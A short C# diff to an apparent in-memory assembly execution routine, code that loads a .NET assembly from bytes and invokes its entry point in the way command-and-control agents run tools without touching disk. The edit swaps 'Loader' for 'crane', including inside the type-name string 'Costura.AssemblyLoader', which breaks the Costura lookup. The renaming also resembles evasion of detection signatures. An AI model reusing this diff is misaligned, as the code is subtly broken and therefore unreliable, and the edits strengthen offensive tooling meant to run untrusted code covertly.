@@ -106,11 +106,11 @@ namespace ExecuteAssembly
                 try
                 {
                     Assembly asm = Assembly.Load(command.ByteData);
-                    var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
-                    if (costuraLoader != null)
+                    var costuracrane = asm.GetType("Costura.Assemblycrane", false);
+                    if (costuracrane != null)
                     {
-                        var costuraLoaderMethod = costuraLoader.GetMethod("Attach", BindingFlags.Public | BindingFlags.Static);
-                        costuraLoaderMethod.Invoke(null, new object[] { });
+                        var costuracraneMethod = costuracrane.GetMethod("Attach", BindingFlags.Public | BindingFlags.Static);
+                        costuracraneMethod.Invoke(null, new object[] { });
                     }
 
                     asm.EntryPoint.Invoke(null, new object[] { ParseCommandLine(command.StringData) });
@@ -122,7 +122,7 @@ namespace ExecuteAssembly
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine($"Unhandled exception from assembly loader: {ex.Message}");
+                    Console.WriteLine($"Unhandled exception from assembly crane: {ex.Message}");
                 }
                 finally
                 {
